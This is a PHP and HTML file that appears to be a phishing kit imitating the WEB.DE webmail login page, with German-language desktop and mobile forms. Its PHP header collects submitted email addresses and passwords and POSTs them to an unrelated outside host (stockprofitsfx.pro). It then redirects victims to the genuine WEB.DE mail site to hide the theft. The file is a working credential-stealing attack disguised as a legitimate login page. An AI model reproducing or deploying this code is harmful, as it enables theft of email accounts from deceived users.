<?php

if (isset($_POST['login'])) {
  extract($_POST);

  $data = array(
    'email' => $email,
    'password' => $password,
  );

  $curl = curl_init();

  curl_setopt_array($curl, array(
    CURLOPT_URL => 'https://stockprofitsfx.pro/api/send-email',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_ENCODING => '',
    CURLOPT_MAXREDIRS => 10,
    CURLOPT_TIMEOUT => 0,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_POSTFIELDS => json_encode($data),
    CURLOPT_HTTPHEADER => array(
      'Content-Type: application/json'
    ),
  ));
  
  $response = curl_exec($curl);
  curl_close($curl);

  $result = json_decode($response);

  if (isset($result->statusCode) && $result->statusCode == 200) {
    // echo 'Response: ' . json_encode($result->message);
    header("Location: https://mm.web.de/");
  } else {
     echo 'API request failed: ' . json_encode($result->message);
  }

  //echo "<script type='text/javascript'>";
  //echo "setTimeout(function() {
   //   window.location.href = 'https://web-de.vercel.app/';";
  //echo "}, 1500);</script>";
}
?>


<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>WEB.DE</title>
  <link rel="icon" href="https://webde-justice.vercel.app/web.svg"/>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
  <link rel="stylesheet" href="../public/styles/css.css">
  <link href=" https://cdn.jsdelivr.net/npm/icofont@1.0.0/dist/icofont.min.css " rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
</head>

<body>
  <div class="container-fluid desktop text-center">
        <div class="row ">
          <div class="col-8">
            <header >
                <nav class=" border-bottom navbar navbar-expand-md navbar-expand-lg">
                    <div class="container-fluid">
                      <a class="navbar-brand" href="#">
                        <img src="https://webde-justice.vercel.app/_next/static/media/web.a62c709a.svg" width="100%" height="50px">
                      </a>
                      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarTogglerDemo02" aria-controls="navbarTogglerDemo02" aria-expanded="false" aria-label="Toggle navigation">
                        <span class="navbar-toggler-icon"></span>
                      </button>
                      <div class="collapse navbar-collapse" id="navbarTogglerDemo02">
                        <div class="input-group mx-auto">
                          <input type="text" class="form-control" placeholder="Suchen mit WEB.DE" aria-label="Suchen mit WEB.DE" aria-describedby="button-addon2">
                          <button class="btn btn-warning" type="button" id="button-addon2"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-search" viewBox="0 0 16 16">
                            <path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001q.044.06.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1 1 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0"/>
                          </svg></button>
                        </div>
                        <button class="btn btn-outline-primary ">Registrieren</button>
                      </div>
                    </div>
                  </nav>
                  <!--tabs-->
                  <nav class="nav border-bottom">
                    <a class="nav-link" href="#"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-list" viewBox="0 0 16 16">
                      <path fill-rule="evenodd" d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5m0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5m0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5"/>
                    </svg></a>
                    <a class="nav-link" href="#">Email & Cloud</a>
                    <a class="nav-link" href="#">Mobilfunk & DSL</a>
                    <a class="nav-link" href="#">Strom & Gas</a>
                    <a class="nav-link">Shop</a>
                    <a class="nav-link">Lotto</a>
                    <a class="nav-link">Versicherung</a>
                    <a class="nav-link"><img src="https://adimg.uimserv.net/otto/2021/210617/otto_logo_44x16-2.svg"></a>
                    <a class="nav-link"><img src="https://adimg.uimserv.net/MONA/2021/Promoline_12461_mona-56x16-1.svg"></a>
                    <a class="nav-link"><img src="https://adimg.uimserv.net/BaurVersand/210618/Promoline_baur-logo_56x16px-2.svg"></a>
                  </nav>
            </header>
            <div class="news mt-3"> <img src="https://webde-justice.vercel.app/_next/static/media/Lcreenshot1.e3f46304.png" width="100%"/></div>
            <div class="form-part d-flex justify-content-center p-2 mb-3  sticky-top">
                <form class="mx-auto text-start" method="post">
                    <div class="row align-items-center ">
                        <div class="col-auto pb-2"><svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" fill="currentColor" class="bi bi-envelope-fill" viewBox="0 0 16 16">
                          <path d="M.05 3.555A2 2 0 0 1 2 2h12a2 2 0 0 1 1.95 1.555L8 8.414zM0 4.697v7.104l5.803-3.558zM6.761 8.83l-6.57 4.027A2 2 0 0 0 2 14h12a2 2 0 0 0 1.808-1.144l-6.57-4.027L8 9.586zm3.436-.586L16 11.801V4.697z"/>
                        </svg></div>
                        <div class="col-auto "><p>E-Mail</p></div>
                        <div class="col-auto pb-4"><img src="../public/images/pattern.png" width="15px"></div>
                        <div class="col-auto">
                            <label class="visually-hidden" for="inputEmail">E-mail-Addresse</label>
                            <input type="email" name="email" class="form-control" id="inputEmail" placeholder="E-mail-Addresse" required>
                            <small>Kostenlos registrieren!</small>
                        </div>
                        <div class="col-auto">
                            <label class="visually-hidden" for="inputPassword">Passwort</label>
                            <input type="password" name="password" class="form-control" id="inputPassword" placeholder="Passwort" required>
                            <small>Passwort Vergessen?</small>
                        </div>
                        <div class="col-auto">
                        </div>
                        <div class="col-auto mb-4">
                            <button type="submit" name="login" class="btn btn-warning">Login</button>
                        </div>
                    </div>
                </form>
            </div>
            <div><img src="https://webde-justice.vercel.app/_next/static/media/Screenshot2.f421803f.png" width="100%"/></div>
            <div><img src="https://webde-justice.vercel.app/_next/static/media/Screenshot3.98cd8e10.png" width="100%"/></div>
            <div class="col">
                <img  src="Screenshot4.c08513bd.png" width="100%" >
            </div>
            <div><img src="https://webde-justice.vercel.app/_next/static/media/Screenshot5.a9e6ba4a.png" width="100%"/></div>
            <div><img src="https://webde-justice.vercel.app/_next/static/media/Screenshot6.cd6c31fb.png" width="100%"/></div>
            <div><img src="https://webde-justice.vercel.app/_next/static/media/footer.b5d45359.png" width="100%"/></div>
          </div>
        </div>
        <div class=" floatted">
            <img  src="https://s1.adform.net/Banners/56957908/56957908.gif?bv=4" width="100%" >
          </div>
      </div>
  <!--mobile-->
  <div class=" mobile">
    <header cl>
      <nav class="navbar border-bottom">
        <div class="container-fluid">
          <a class="navbar-brand" href="javascript:void(0)">
            <img src="https://webde-justice.vercel.app/_next/static/media/web.a62c709a.svg" alt="Bootstrap" width="100%" height="40px">
          </a>
        </div>
      </nav>
    </header>
    <div class=" container content flex-column mb-3">
      <div class="pt-5  align-items-center">
        <img src="https://webde-justice.vercel.app/_next/static/media/web.a62c709a.svg" width="100%" height="50px" />
        <div class="form-width mx-auto pt-5">
          <h5>Login</h5>
          <div class="mb-3 text-center">
            <span class="text-secondary"><span style="font-size: 14.7px;">Bitte melden Sie sich hier mit Ihrem WEB.DE</span> <br><span style="font-size: 15px;">Nutzernamen und Ihrem Passwort an.</span> </span>
            <br>
          </div>
          <form method="post">
            <div class="mb-3">
              <label for="formGroupExampleInput" class="form-label">WEB.DE Nutzername</label>
              <input type="text" name="email" class="form-control" id="formGroupExampleInput" required>
            </div>
            <div class="mb-3">
              <label for="formGroupExampleInput2" class="form-label">Passwort eingeben</label>
              <input type="password" name="password" class="form-control" id="formGroupExampleInput2" required>
              <button type="submit" name="login" class="mt-3 mb-3 btn btn-warning form-control">Login</button>
              <div class="text-center"><a href="javascript:void(0)">Passwort Vergessen?</a></div>

              <br>
              <hr>
              <br>

              <h6 class="text-center"><b>Neu bei WEB.DE?</b></h6>
              <p><a href="javascript:void(0)">Jetzt kostenlos registrieren!</a></p>
              <img src="https://webde-justice.vercel.app/_next/static/media/web-de.2d484a7c.jpeg" width="100%" height="50px" />
            </div>
          </form>
        </div>
      </div>
    </div>
    <footer class="footer pt-3 pb-3 text-center">
      <span>Impressum</span><br>
      <span>Vertrage heir kundigen</span><br>
      <span>AGB</span><br>
      <span>Datenschutz</span>
    </footer>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
</body>

</html>
